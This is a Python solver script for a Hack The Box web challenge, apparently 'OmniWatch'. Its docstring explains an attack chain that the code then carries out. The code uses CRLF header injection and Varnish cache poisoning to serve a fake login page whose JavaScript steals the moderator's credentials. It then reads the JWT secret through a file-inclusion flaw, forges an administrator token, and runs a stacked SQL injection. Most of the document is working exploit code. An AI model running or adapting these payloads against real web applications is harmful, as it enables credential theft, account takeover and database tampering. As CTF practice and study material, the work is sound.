#!/usr/bin/env python3
"""
OmniWatch - HTB TryOut (Hard Web, code-audit) — full solver
===========================================================
Attack chain (all findings from source audit of challenge/oracle + controller):

 1) CRLF injection in the Zig "oracle" service
      - oracle/main.zig reflects `deviceId` into the response header `DeviceId`
        (response.zig's prepareForWrite does NOT sanitize CRLF in header values).
      - So GET /oracle/<mode>/<deviceId>%0d%0a<Header>: <value> injects headers.

 2) Varnish cache-key abuse (config/cache.vcl)
      - sub vcl_hash { hash_data(req.http.CacheKey); }  -> cache key is ONLY the
        request's CacheKey header; URL is ignored. Any backend response carrying
        `CacheKey: enable` is cached for 10s.
      - CRLF-injecting `Content-Type: text/html` + `CacheKey: enable` into the
        oracle response turns the oracle into an XSS + cache-poisoning primitive.

 3) IMPORTANT Varnish detail: an ABSENT `CacheKey` request header and a PRESENT
      `CacheKey:` (empty) header hash to DIFFERENT cache slots. The bot/browser
      sends NO CacheKey header, so the poison MUST also be sent with NO CacheKey
      header (else the bot never sees the poisoned object).

 4) In-band exfil (the challenge container has NO outbound internet, so a webhook
      does not work). The bot logs in as moderator on /controller/login. We poison
      the "absent" cache slot with a spoofed login page that:
        - has #username/#password/#login-btn so Selenium types the real moderator
          credentials into it;
        - reads the typed values and re-emits base64(user:pass) into a SEPARATE
          Varnish slot by fetching
            /oracle/json/<b64>%0d%0aCacheKey: enable
          with the request header `CacheKey: owx1` (separate slot -> no collision).
      We read the "owx1" slot back -> moderator credentials.

 5) Use the moderator session:
      - login -> moderator JWT
      - /controller/firmware LFI: `open(os.path.join(cwd,"application","firmware",
        patch))` with an absolute patch (/app/jwt_secret.txt) -> JWT_KEY.
      - forge an HS256 administrator JWT (account_type=administrator, user_id=1).
      - /controller/device/<id> stacked SQLi (fetch_device builds an unparameterized
        query and database.query() splits on ';' when multi=True):
           1' OR '1'='1' LIMIT 1; UPDATE signatures SET signature='<forged-sig>' WHERE user_id=1; --
        (signature must be written as a STRING literal, NOT 0x<hex>, because the
         binary 0x.. comes back as bytes and the middleware's `str != bytes` check
         would reject it.)
      - visit /controller/admin with the forged JWT -> /readflag -> flag.

Run:
  python3 solve.py <challenge_url>
The in-band credential capture stage auto-runs and needs `requests` + outbound
access to the challenge (works from the Kali/HexStrike box which is also where the
browser-convey was validated).
"""
import argparse, base64, hashlib, hmac, json, re, sys, time, urllib.parse
import requests

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge_admin_jwt(secret: bytes, user_id=1, username="x"):
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user_id": user_id, "username": username, "account_type": "administrator"}
    hh = b64u(json.dumps(header, separators=(",", ":")).encode())
    pp = b64u(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64u(hmac.new(secret, (hh + "." + pp).encode(), hashlib.sha256).digest())
    return hh + "." + pp + "." + sig

class Solver:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.s = requests.Session()

    # ---------- stage A: in-band moderator credential capture ----------
    def _poison_spoof(self, spoof_html):
        hdr = "\r\nContent-Type: text/html\r\nX-Content-Type-Options: undefined\r\nCacheKey: enable"
        url = f"/oracle/{urllib.parse.quote(spoof_html, safe='')}/99{urllib.parse.quote(hdr, safe='')}"
        # NO CacheKey request header -> fills the "absent" slot the browser uses
        return self.s.get(self.base + url, timeout=6, allow_redirects=False).status_code

    def _read_slot(self, key):
        r = self.s.get(self.base + "/oracle/json/1", headers={"CacheKey": key}, timeout=6,
                       allow_redirects=False)
        return r.headers.get("DeviceId", ""), r.headers.get("CacheKey", "")

    def capture_creds(self, timeout=420):
        spoof = (
            "<html><body><h1>OmniWatch</h1>"
            "<form id='f'><input id='username' name='username' autocomplete='off'>"
            "<input id='password' name='password' autocomplete='off' type='password'>"
            "<button id='login-btn' type='button'>LOGIN</button></form>"
            "<script>"
            "var done=false;"
            "setInterval(function(){"
            " var u=document.getElementById('username');var p=document.getElementById('password');"
            " if(u&&p&&u.value&&p.value&&!done){"
            "  var b64=btoa(u.value+':'+p.value); var tries=0;"
            "  var iv=setInterval(function(){"
            "    try{fetch('/oracle/json/'+encodeURIComponent(b64)+'%0d%0a'+'CacheKey: enable',"
            "        {headers:{'CacheKey':'owx1'},mode:'cors'});}catch(e){}"
            "    tries++; if(tries>50){clearInterval(iv);done=true;}"
            "  },200);"
            "  done=true;"
            " }"
            "},150);"
            "</script></body></html>"
        )
        t0 = time.time()
        while time.time() - t0 < timeout:
            self._poison_spoof(spoof)          # keep absent slot poisoned
            did, ck = self._read_slot("owx1")
            if did and "enable" in ck and len(did) > 14:
                m = re.search(r"([A-Za-z0-9+/=]{16,})", did)
                if m:
                    try:
                        dec = base64.b64decode(m.group(1)).decode()
                        if ":" in dec and len(dec) < 70:
                            return dec
                    except Exception:
                        pass
            time.sleep(0.7)
        return None

    # ---------- stage B: post-credential chain ----------
    def solve(self, creds):
        user, password = creds.split(":", 1)
        r = self.s.post(f"{self.base}/controller/login",
                        data={"username": user, "password": password},
                        allow_redirects=False, timeout=10)
        jwt_cookie = next((c.value for c in self.s.cookies if c.name == "jwt"), None)
        assert jwt_cookie, "login failed"
        print("[+] logged in as moderator")

        r = self.s.post(f"{self.base}/controller/firmware",
                        data={"patch": "/app/jwt_secret.txt"},
                        cookies={"jwt": jwt_cookie}, allow_redirects=False, timeout=10)
        secret = r.content  # exact bytes (no strip)
        print("[+] jwt_secret:", repr(secret))

        admin_jwt = forge_admin_jwt(secret)
        sig = admin_jwt.split(".")[-1]
        print("[+] forged admin JWT:", admin_jwt)

        sqli = f"1' OR '1'='1' LIMIT 1; UPDATE signatures SET signature='{sig}' WHERE user_id=1; -- "
        enc = urllib.parse.quote(sqli, safe="")
        if not enc.endswith(" "):
            enc += "%20"
        self.s.get(f"{self.base}/controller/device/{enc}",
                   cookies={"jwt": jwt_cookie}, allow_redirects=False, timeout=15)

        s2 = requests.Session()
        r = s2.get(f"{self.base}/controller/admin", cookies={"jwt": admin_jwt},
                   allow_redirects=False, timeout=10)
        m = re.search(r"HTB\{[^}]+\}", r.text)
        if not m:
            raise SystemExit("[!] flag not found; status " + str(r.status_code))
        print("FLAG>>>" + m.group(0) + "<<<FLAG")
        return m.group(0)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base")
    ap.add_argument("--creds", default="")
    args = ap.parse_args()
    sol = Solver(args.base)
    if args.creds:
        creds = args.creds
    else:
        print("[*] capturing moderator credentials in-band...")
        creds = sol.capture_creds()
        assert creds, "[!] creds capture failed"
        print("[+] captured:", creds)
    flag = sol.solve(creds)
    with open("final_flag.txt", "w") as f:
        f.write(flag + "\n")
    print("[+] saved final_flag.txt")


if __name__ == "__main__":
    main()
